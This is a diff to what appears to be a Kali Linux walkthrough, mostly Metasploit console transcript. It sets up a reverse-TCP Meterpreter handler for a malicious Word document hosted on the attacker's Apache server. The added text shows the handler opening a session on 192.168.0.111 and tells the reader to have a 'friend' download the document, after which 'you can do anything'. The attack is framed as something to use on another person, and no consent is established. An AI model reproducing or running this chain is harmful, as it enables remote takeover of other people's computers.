@@ -1,3 +1,6 @@
+
+Note:- This will work only on windows 10 , msoffice 2016, firewall off 
+
 root@kali:~# msfconsole -q
 msf5 > search office_word
 
@@ -131,6 +134,95 @@ Jul 16 10:28:35 kali apachectl[2865]: AH00558: apache2: Could not reliably deter
 Jul 16 10:28:35 kali systemd[1]: Started The Apache HTTP Server.
 
 root@kali:~# 
+
+
+**starting Reverse Handler 
+
+root@kali:/var/www/html# msfconsole -q
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > 
+
+root@kali:/var/www/html# msfconsole -q
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > set LHOST 1922.168.0.115
+[-] The following options failed to validate: Value '1922.168.0.115' is not valid for option 'LHOST'.
+LHOST => 
+msf5 exploit(multi/handler) > set LHOST 192.168.0.115
+LHOST => 192.168.0.115
+msf5 exploit(multi/handler) > set LPORT 3535
+LPORT => 3535
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.115    yes       The listen address (an interface may be specified)
+   LPORT     3535             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.115:3535 
+[*] Sending stage (179779 bytes) to 192.168.0.111
+[*] Meterpreter session 1 opened (192.168.0.115:3535 -> 192.168.0.111:50457) at 2019-07-16 10:41:06 +0530
+
+
+
+After your friend hits the URL , then youcan do anything. 
+
+meterpreter > play /root/Downloads/Moonshine.mp3
+[*] Playing /root/Downloads/Moonshine.mp3...
+[*] Done
+
+
+
+
+Ask your freiend to hit the url http://192.168.0.115/  and download the document 
+
+
+
+
 
 
 
